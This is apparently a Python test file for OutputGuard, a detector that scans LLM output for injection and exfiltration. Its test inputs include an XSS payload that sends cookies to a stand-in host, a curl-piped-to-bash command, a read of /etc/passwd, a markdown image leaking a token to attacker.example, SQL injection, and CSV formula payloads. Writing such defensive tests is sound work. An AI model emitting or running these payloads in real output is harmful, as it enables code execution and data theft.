"""Tests for OutputGuard — ported from output-guard.test.ts (LLM05)."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from llm_trust_guard.guards.output_guard import OutputGuard, OutputGuardConfig


class TestBasicFunctionality:
    def test_should_create_a_guard_with_default_config(self):
        guard = OutputGuard()
        assert guard.guard_name == "OutputGuard"
        assert guard.guard_layer == "L35"

    def test_should_allow_benign_prose(self):
        r = OutputGuard().scan("Here is a summary of your account: balance is $42, last login Tuesday.")
        assert r.allowed is True
        assert r.risk_score == 0
        assert len(r.threats) == 0

    def test_should_handle_empty_and_non_string_safely(self):
        assert OutputGuard().scan("").allowed is True
        assert OutputGuard().scan(None).allowed is True  # type: ignore[arg-type]


class TestHtmlXss:
    def test_should_block_script_tag(self):
        r = OutputGuard().scan("Welcome <script>fetch('//evil/'+document.cookie)</script>")
        assert r.allowed is False
        assert any(t.sink == "html" and t.severity == "critical" for t in r.threats)

    def test_should_block_img_onerror(self):
        r = OutputGuard().scan('<img src=x onerror="alert(1)">')
        assert r.allowed is False
        assert any(v.startswith("html:") for v in r.violations)

    def test_should_flag_javascript_uri(self):
        r = OutputGuard().scan("Click <a href=javascript:stealCookies()>here</a>")
        assert any("javascript:" in t.detail for t in r.threats)

    def test_should_not_flag_word_javascript_in_prose(self):
        r = OutputGuard().scan("I recommend learning JavaScript before TypeScript.")
        assert r.allowed is True


class TestSqlInjection:
    def test_should_block_union_select(self):
        r = OutputGuard().scan("1 UNION SELECT username, password FROM users")
        assert r.allowed is False
        assert any(t.sink == "sql" for t in r.threats)

    def test_should_block_tautology_and_drop(self):
        r = OutputGuard().scan("'; DROP TABLE users; -- ")
        assert r.allowed is False

    def test_should_allow_normal_select_sentence(self):
        r = OutputGuard().scan("Please select an option from the dropdown to continue.")
        assert r.allowed is True


class TestShellInjection:
    def test_should_block_curl_piped_to_bash(self):
        r = OutputGuard().scan("Run: curl http://evil.sh/install | bash")
        assert r.allowed is False
        assert any(t.sink == "shell" and t.severity == "critical" for t in r.threats)

    def test_should_block_command_substitution(self):
        r = OutputGuard().scan("echo $(cat /etc/passwd)")
        assert any(t.sink == "shell" for t in r.threats)


class TestMarkdownExfil:
    def test_should_flag_image_with_query_string(self):
        r = OutputGuard().scan("![](https://attacker.example/log?data=SECRET_TOKEN)")
        assert any(t.type == "markdown_image_exfil" for t in r.threats)
        assert any(v.startswith("markdown:image_exfil") for v in r.violations)

    def test_should_not_flag_plain_image(self):
        r = OutputGuard().scan("![logo](https://cdn.example/logo.png)")
        assert r.allowed is True

    def test_should_flag_offdomain_when_allowlist_set(self):
        guard = OutputGuard(OutputGuardConfig(allowed_domains=["trusted.com"]))
        r = guard.scan("See [report](https://evil.net/x) and ![](https://trusted.com/a.png)")
        assert any("evil.net" in t.detail for t in r.threats)
        assert not any("trusted.com" in t.detail for t in r.threats)


class TestCsvFormulaInjection:
    def test_should_flag_cell_beginning_with_equals(self):
        r = OutputGuard().scan('name,note\nAlice,=HYPERLINK("http://evil","click")')
        assert any(t.sink == "csv" for t in r.threats)
        assert any(v.startswith("csv:formula") for v in r.violations)

    def test_should_block_multiple_high_severity(self):
        r = OutputGuard().scan('=HYPERLINK("x")\n![](https://evil/?d=SECRET)')
        assert r.allowed is False

    def test_should_flag_leaders_only_with_dangerous_fn(self):
        danger = OutputGuard().scan("col\n@SUM(cmd|'/c calc')")
        assert any(t.sink == "csv" for t in danger.threats)
        benign = OutputGuard().scan("delta\n-5\n+3\n@username")
        assert not any(t.sink == "csv" for t in benign.threats)


class TestConfigAndSanitization:
    def test_should_respect_disabled_detectors(self):
        guard = OutputGuard(OutputGuardConfig(detect_html=False))
        r = guard.scan("<script>x</script>")
        assert not any(t.sink == "html" for t in r.threats)

    def test_should_honor_custom_blocked_patterns(self):
        guard = OutputGuard(OutputGuardConfig(blocked_patterns=["BEGIN RSA PRIVATE KEY"]))
        r = guard.scan("-----BEGIN RSA PRIVATE KEY-----")
        assert any(v.startswith("blocked_pattern:") for v in r.violations)

    def test_should_produce_neutralized_output(self):
        guard = OutputGuard(OutputGuardConfig(sanitize=True))
        r = guard.scan('hi <script>evil()</script>\n=HYPERLINK("x")')
        assert r.sanitized is not None
        assert "<script>" not in r.sanitized
        assert "'=HYPERLINK" in r.sanitized
